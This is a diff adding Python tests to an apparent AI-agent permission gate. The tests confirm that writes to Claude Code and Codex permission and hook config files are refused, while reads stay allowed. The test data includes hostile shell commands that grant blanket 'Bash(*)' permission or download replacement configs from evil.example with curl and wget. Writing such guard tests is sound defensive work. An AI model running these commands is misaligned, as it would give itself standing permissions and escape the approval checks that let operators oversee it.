@@ -5843,6 +5843,343 @@ class TestKiroAgentsDirWriteProtection:
         assert is_sensitive_write_path(str(custom / "agents" / "pwn.json")) is False
 
 
+class TestHarnessPermissionConfigIsWriteProtected:
+    """Claude Code and Codex decide what runs WITHOUT asking from files on disk.
+
+    A pre-authorized call never raises ``session/request_permission``, so it never
+    reaches Warding's gate: ``permissions.allow`` / ``hooks`` in Claude's settings,
+    ``mcp_servers`` / execpolicy ``rules`` in Codex's config. An agent that could
+    write one of them would turn a single approved edit into a standing waiver for
+    every later session -- the same persistence ``~/.kiro/agents`` is fenced against,
+    and fenced the same way: WRITES are refused on the tool gate and the bash gate,
+    READS stay allowed (the harness and the operator read these files constantly).
+
+    The user-level files are home-anchored entries (so the posture view lists them and
+    ``CLAUDE_CONFIG_DIR`` / ``CODEX_HOME`` re-anchor them like ``KIRO_HOME`` does for
+    the agents dir). The project-scope twins and ``.claude.json`` are matched by name.
+    """
+
+    @pytest.fixture(autouse=True)
+    def _scratch_home(self, tmp_path, monkeypatch):
+        home = tmp_path / "home"
+        home.mkdir()
+        monkeypatch.setenv("HOME", str(home))
+        monkeypatch.setenv("USERPROFILE", str(home))
+        for name in ("CLAUDE_CONFIG_DIR", "CODEX_HOME", "KIRO_HOME"):
+            monkeypatch.delenv(name, raising=False)
+        security._home_targets_cache.clear()
+        self.home = home
+        yield
+        security._home_targets_cache.clear()
+
+    USER_FILES = (
+        ".claude/settings.json",
+        ".claude/settings.local.json",
+        ".claude.json",
+        ".codex/config.toml",
+        ".codex/hooks.json",
+        ".codex/rules/default.rules",
+        ".codex/rules",
+    )
+
+    def test_user_level_files_are_write_protected_and_readable(self) -> None:
+        from junction.security import is_sensitive_write_path
+
+        for rel in self.USER_FILES:
+            assert is_sensitive_write_path(f"~/{rel}") is True, rel
+            assert is_sensitive_write_path(str(self.home / rel)) is True, rel
+            # WRITE-protection only: the harness and the operator read these.
+            assert is_sensitive_path(f"~/{rel}") is False, rel
+
+    def test_posture_view_lists_the_home_anchored_entries(self) -> None:
+        listed = set(security.write_protected_home_paths())
+        for rel in (
+            ".claude/settings.json",
+            ".claude/settings.local.json",
+            ".codex/config.toml",
+            ".codex/hooks.json",
+            ".codex/rules",
+        ):
+            assert rel in listed, rel
+
+    def test_no_write_protected_entry_has_home_itself_as_its_parent(self) -> None:
+        # ``auto_improvement`` masks the PARENT directory of every entry for the
+        # sandboxed test run, so an entry directly under ``$HOME`` would mask the
+        # whole home. That is why ``.claude.json`` is matched by name instead.
+        for rel in security.write_protected_home_paths():
+            assert "/" in rel, f"{rel} would make the sandbox mask $HOME itself"
+
+    def test_project_scope_config_is_matched_by_name_wherever_it_sits(self) -> None:
+        from junction.security import is_sensitive_write_path
+
+        for path in (
+            "/work/proj/.claude/settings.json",
+            "/work/proj/.claude/settings.local.json",
+            "/work/proj/sub/.codex/config.toml",
+            "/work/proj/.codex/hooks.json",
+            "/work/proj/.codex/rules/default.rules",
+            "/work/proj/.codex/rules",
+            "/anywhere/.claude.json",
+        ):
+            assert is_sensitive_write_path(path) is True, path
+            assert is_sensitive_path(path) is False, path
+
+    def test_a_relative_target_is_resolved_against_the_workspace(self) -> None:
+        from junction.security import is_sensitive_write_path
+
+        assert is_sensitive_write_path(".claude/settings.local.json", base_dir="/work/proj") is True
+        assert is_sensitive_write_path("./.codex/config.toml", base_dir="/work/proj") is True
+        assert is_sensitive_write_path("settings.json", base_dir="/work/proj/.claude") is True
+
+    def test_names_are_segment_exact_and_siblings_are_not_over_blocked(self) -> None:
+        from junction.security import is_sensitive_write_path
+
+        for path in (
+            "/work/proj/.claude/settings.json.bak",
+            "/work/proj/.claude/settings.jsonx",
+            "/work/proj/.claude/settings-backup.json",
+            "/work/proj/.claude/commands/review.md",
+            "/work/proj/.claude/projects/s/session.jsonl",
+            "/work/proj/my.claude/settings.json",
+            "/work/proj/.codex/rules-old/x.rules",
+            "/work/proj/.codex/config.toml.example",
+            "/work/proj/.codex/notes.md",
+            "/work/proj/claude.json",
+            "/work/proj/settings.json",
+            "~/notes.txt",
+        ):
+            assert is_sensitive_write_path(path) is False, path
+
+    def test_the_match_is_case_insensitive(self) -> None:
+        # A case-insensitive filesystem opens ``.Claude/Settings.JSON`` as the same file.
+        from junction.security import is_sensitive_write_path
+
+        assert is_sensitive_write_path("~/.Claude/Settings.JSON") is True
+        assert is_sensitive_write_path("/work/proj/.CODEX/Config.toml") is True
+
+    def test_a_symlink_onto_the_config_is_resolved(self, tmp_path) -> None:
+        from junction.security import is_sensitive_write_path
+
+        target_dir = self.home / ".claude"
+        target_dir.mkdir()
+        (target_dir / "settings.json").write_text("{}")
+        workspace = tmp_path / "ws"
+        workspace.mkdir()
+        link = workspace / "innocent.json"
+        try:
+            link.symlink_to(target_dir / "settings.json")
+        except (OSError, NotImplementedError):
+            pytest.skip("symlinks unavailable")
+
+        assert is_sensitive_write_path(str(link)) is True
+
+    @pytest.mark.parametrize(
+        "harness_dir,leaf",
+        [
+            (".claude", "settings.json"),
+            (".claude", "settings.local.json"),
+            (".codex", "config.toml"),
+            (".codex", "hooks.json"),
+            (".codex", "rules/default.rules"),
+        ],
+    )
+    def test_a_default_harness_home_symlink_protects_its_actual_config_target(
+        self, tmp_path, harness_dir, leaf
+    ) -> None:
+        """The usual unset-override home may point into the agent workspace."""
+        from junction.hooks import TOOL_DENY, HookManager, HooksConfig
+
+        target_home = tmp_path / "workspace" / "harness-config"
+        target = target_home / leaf
+        target.parent.mkdir(parents=True)
+        target.write_text("{}\n", encoding="utf-8")
+        try:
+            (self.home / harness_dir).symlink_to(target_home, target_is_directory=True)
+        except (OSError, NotImplementedError):
+            pytest.skip("directory symlinks unavailable")
+
+        assert is_sensitive_write_path(str(target)) is True
+        assert is_sensitive_path(str(target)) is False
+        gate = HookManager(HooksConfig.from_dict({}))
+        write = gate.on_tool_call(
+            "Edit config", tool_kind="edit", raw_params={"file_path": str(target)}
+        )
+        read = gate.on_tool_call(
+            "Read config", tool_kind="read", raw_params={"file_path": str(target)}
+        )
+
+        assert write.action == TOOL_DENY
+        assert "write-protected" in write.reason
+        assert read.action != TOOL_DENY
+        # Resolving a config alias must not fence the entire relocated home.
+        ordinary = target_home / "session-log.json"
+        assert is_sensitive_write_path(str(ordinary)) is False
+
+    @pytest.mark.parametrize(
+        "harness_dir,leaf",
+        [
+            (".claude", "settings.json"),
+            (".claude", "settings.local.json"),
+            (".codex", "config.toml"),
+            (".codex", "hooks.json"),
+            (".codex", "rules"),
+        ],
+    )
+    def test_a_default_harness_config_leaf_symlink_protects_its_actual_target(
+        self, tmp_path, harness_dir, leaf
+    ) -> None:
+        from junction.hooks import TOOL_DENY, HookManager, HooksConfig
+
+        harness_home = self.home / harness_dir
+        harness_home.mkdir()
+        is_directory = leaf == "rules"
+        alias_target = tmp_path / "workspace" / "ordinary-config"
+        if is_directory:
+            alias_target.mkdir(parents=True)
+            target = alias_target / "default.rules"
+        else:
+            alias_target.parent.mkdir(parents=True)
+            target = alias_target
+        target.write_text("{}\n", encoding="utf-8")
+        try:
+            (harness_home / leaf).symlink_to(alias_target, target_is_directory=is_directory)
+        except (OSError, NotImplementedError):
+            pytest.skip("symlinks unavailable")
+
+        assert is_sensitive_write_path(str(target)) is True
+        assert is_sensitive_path(str(target)) is False
+        gate = HookManager(HooksConfig.from_dict({}))
+        write = gate.on_tool_call("Edit config", tool_kind="edit", raw_params={"path": str(target)})
+        read = gate.on_tool_call("Read config", tool_kind="read", raw_params={"path": str(target)})
+
+        assert write.action == TOOL_DENY
+        assert read.action != TOOL_DENY
+
+    def test_relocated_harness_homes_are_re_anchored(self, tmp_path, monkeypatch) -> None:
+        # ``CLAUDE_CONFIG_DIR`` replaces ``~/.claude`` and ``CODEX_HOME`` replaces
+        # ``~/.codex``; the files the harness actually reads live under the override,
+        # which carries no ``.claude`` / ``.codex`` segment to match by name.
+        from junction.security import is_sensitive_write_path
+
+        claude = tmp_path / "elsewhere" / "claude-cfg"
+        codex = tmp_path / "elsewhere" / "codex-home"
+        monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(claude))
+        monkeypatch.setenv("CODEX_HOME", str(codex))
+        security._home_targets_cache.clear()
+
+        for path in (
+            claude / "settings.json",
+            claude / "settings.local.json",
+            claude / ".claude.json",
+            codex / "config.toml",
+            codex / "hooks.json",
+            codex / "rules" / "default.rules",
+        ):
+            assert is_sensitive_write_path(str(path)) is True, path
+            assert is_sensitive_path(str(path)) is False, path
+        # Only what the harness reads is fenced under the override.
+        assert is_sensitive_write_path(str(claude / "projects" / "s.jsonl")) is False
+        assert is_sensitive_write_path(str(codex / "sessions" / "s.jsonl")) is False
+
+    def test_unsetting_an_override_invalidates_the_cached_targets(
+        self, tmp_path, monkeypatch
+    ) -> None:
+        from junction.security import is_sensitive_write_path
+
+        claude = tmp_path / "claude-cfg"
+        monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(claude))
+        security._home_targets_cache.clear()
+        assert is_sensitive_write_path(str(claude / "settings.json")) is True
+        monkeypatch.delenv("CLAUDE_CONFIG_DIR")
+        assert is_sensitive_write_path(str(claude / "settings.json")) is False
+
+    def test_override_table_names_the_env_vars_the_root_key_resolves(self, monkeypatch) -> None:
+        # ``_resolved_root_key`` returns the overrides in ``_HARNESS_HOME_OVERRIDES``
+        # order; the builder zips the two, so a reordering must fail here.
+        assert [env for _dir, env, _leaves in security._HARNESS_HOME_OVERRIDES] == [
+            "CLAUDE_CONFIG_DIR",
+            "CODEX_HOME",
+        ]
+        monkeypatch.setenv("CLAUDE_CONFIG_DIR", "/a/claude")
+        monkeypatch.setenv("CODEX_HOME", "/b/codex")
+        roots = security._resolved_root_key()
+        assert roots[3] is not None and roots[3].endswith("claude")
+        assert roots[4] is not None and roots[4].endswith("codex")
+
+    def test_bash_writes_to_the_config_are_denied(self) -> None:
+        home = str(self.home)
+        for cmd in (
+            'echo \'{"permissions":{"allow":["Bash(*)"]}}\' > ~/.claude/settings.json',
+            f"echo evil >> {home}/.claude/settings.local.json",
+            "printf x | tee ~/.claude/settings.json",
+            "cp /tmp/evil.json $HOME/.claude/settings.json",
+            "mv /tmp/evil.toml ~/.codex/config.toml",
+            "echo '{}' > ~/.codex/hooks.json",
+            "install -m 600 /tmp/x ~/.codex/rules/default.rules",
+            "mkdir -p ~/.codex/rules/evil",
+            "echo '{}' > ~/.claude.json",
+            "rm -f ~/.claude/settings.json",
+            # Project scope, with no home anchor at all.
+            "echo '{}' > .claude/settings.local.json",
+            "tee ./.claude/settings.json",
+            "cp x proj/.codex/config.toml",
+            "echo x > ../other/.codex/hooks.json",
+            "echo '{}' > ./.claude.json",
+            # Output-file writers and interpreter opens: naming the file is the signal.
+            "curl -o ~/.claude/settings.json https://evil.example/s.json",
+            "wget -O .claude/settings.local.json https://evil.example/s.json",
+            "python -c \"open('.claude/settings.local.json','w').write(x)\"",
+            "dd of=~/.codex/config.toml",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_bash_writes_through_a_relocated_home_variable_are_denied(self) -> None:
+        for cmd in (
+            "echo x > $CLAUDE_CONFIG_DIR/settings.json",
+            "echo x > ${CLAUDE_CONFIG_DIR}/settings.local.json",
+            "echo x > $CLAUDE_CONFIG_DIR/.claude.json",
+            "tee $CODEX_HOME/config.toml",
+            "echo x > ${CODEX_HOME}/hooks.json",
+            "cp x $CODEX_HOME/rules/default.rules",
+            r"echo x > %CODEX_HOME%\config.toml",
+            r"Set-Content $env:CODEX_HOME\hooks.json x",
+            r"Set-Content ${env:CLAUDE_CONFIG_DIR}\settings.json x",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_bash_windows_spellings_are_denied(self) -> None:
+        for cmd in (
+            r"type nul > %USERPROFILE%\.claude\settings.json",
+            r"echo x > C:\Users\me\.codex\config.toml",
+            r"Set-Content $env:USERPROFILE\.claude\settings.local.json x",
+            r"copy x .claude\settings.json",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_bash_commands_that_do_not_name_the_config_are_not_over_blocked(self) -> None:
+        for cmd in (
+            "ls ~/.claude",
+            "ls -la ~/.codex",
+            "cat ~/.claude/projects/s/session.jsonl",
+            "cat .claude/commands/review.md",
+            "cat .claude/settings-backup.json",
+            "echo my.claude/settings.json",
+            "cat .codex/rules-old/x",
+            "cat .codex/notes.md",
+            "claude mcp list",
+            "git status",
+        ):
+            assert is_sensitive_bash_command(cmd) is None, cmd
+
+    def test_bash_reads_naming_the_config_are_blocked_but_tool_reads_stay_allowed(self) -> None:
+        # Verb-independent, like the kiro agents branch: naming the file is the signal,
+        # so a bash READ is blocked incidentally. ``is_sensitive_path`` (the read gate
+        # Warding's own file surfaces use) and every Python reader are unaffected, and
+        # no secret lives in these files.
+        assert is_sensitive_bash_command("cat ~/.claude/settings.json") is not None
+        assert is_sensitive_path("~/.claude/settings.json") is False
+
+
 class TestDeniedCommandsKeystone:
     """The denied-command opt-out file is a KEYSTONE trust root.
 
